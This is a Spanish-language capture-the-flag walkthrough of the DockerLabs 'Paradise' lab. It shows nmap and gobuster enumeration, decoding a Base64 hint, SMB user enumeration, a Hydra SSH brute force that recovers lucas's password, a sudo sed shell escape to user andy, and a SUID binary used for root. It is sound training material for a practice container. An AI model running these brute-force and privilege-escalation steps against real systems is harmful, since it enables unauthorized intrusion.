---
title: "DockerLabs - Paradise"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar el análisis del código fuente, fuerza bruta y escalada de privilegios mediante movimiento entre usuarios.

## Despliegue

```bash
bash auto_deploy.sh paradise.tar
```

## Reconocimiento

Empezamos con un escaneo de puertos:

```bash
nmap -sCV -p- --min-rate 5000 172.17.0.2
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | ssh | OpenSSH 6.6.1p1 Ubuntu |
| 80/tcp | http | Apache httpd 2.4.7 (Ubuntu) |
| 139/tcp | netbios-ssn | Samba smbd 3.X - 4.X |
| 445/tcp | netbios-ssn | Samba smbd 4.3.11-Ubuntu |

El workgroup SMB se llama `PARADISE`. La página web se titula "Andys's House".

## Enumeración web

Lanzamos gobuster para descubrir rutas:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 40
```

Encontramos `galery.html`. Al inspeccionar el código fuente aparece un comentario:

```html
<!-- ZXN0b2VzdW5zZWNyZXRvCg== -->
```

Lo decodificamos:

```bash
echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d
# estoesunsecreto
```

Esto es tanto el nombre de un directorio oculto como una contraseña potencial. Accedemos a:

```
http://172.17.0.2/estoesunsecreto/mensaje_para_lucas.txt
```

Contenido:

```
REMEMBER TO CHANGE YOUR PASSWORD ACCOUNT, BECAUSE YOUR PASSWORD IS DEBIL AND THE HACKERS CAN FIND USING B.F.
```

El mensaje va dirigido a `lucas` — pista directa para fuerza bruta.

## Enumeración SMB

Enumeramos usuarios reales del sistema vía SMB:

```bash
enum4linux -U 172.17.0.2
```

Usuarios encontrados:
- `andy` (Unix User, UID 1000)
- `lucas` (Unix User, UID 1001)

## Explotación — Fuerza bruta SSH

Con el usuario `lucas` y rockyou:

```bash
hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 6 -f
```

Credenciales encontradas: `lucas:chocolate`

```bash
ssh lucas@172.17.0.2
```

## Movimiento lateral — lucas → andy

Comprobamos permisos sudo:

```bash
sudo -l
# (andy) NOPASSWD: /bin/sed
```

Podemos ejecutar `sed` como `andy` sin contraseña. Usamos GTFOBins:

```bash
sudo -u andy /bin/sed -n '1e exec sh 1>&0' /etc/shells
whoami
# andy
```

## Escalada de privilegios — andy → root

Buscamos binarios SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Encontramos `/usr/local/bin/privileged_exec` con SUID de root. Al analizar el binario con strings se observa que llama a `setuid(0)` y luego ejecuta `/bin/bash`:

```
Running with effective UID: %d
setuid
/bin/bash
```

Lo ejecutamos directamente:

```bash
/usr/local/bin/privileged_exec
whoami
# root
```

## Flags

| Flag | Hash |
|------|------|
| user.txt | — |
| root.txt | — |

## Resumen de la cadena

| Fase | Vector | Resultado |
|------|--------|-----------|
| 1 | Gobuster → `galery.html` → comentario Base64 | Secreto: `estoesunsecreto` |
| 2 | Directorio `/estoesunsecreto/mensaje_para_lucas.txt` | Usuario objetivo: `lucas` |
| 3 | enum4linux → usuarios SMB | `andy` y `lucas` confirmados |
| 4 | Hydra brute force SSH (`lucas:chocolate`) | Acceso como lucas |
| 5 | `sudo -u andy /bin/sed` (GTFOBins) | Movimiento lateral a andy |
| 6 | SUID `/usr/local/bin/privileged_exec` | root |
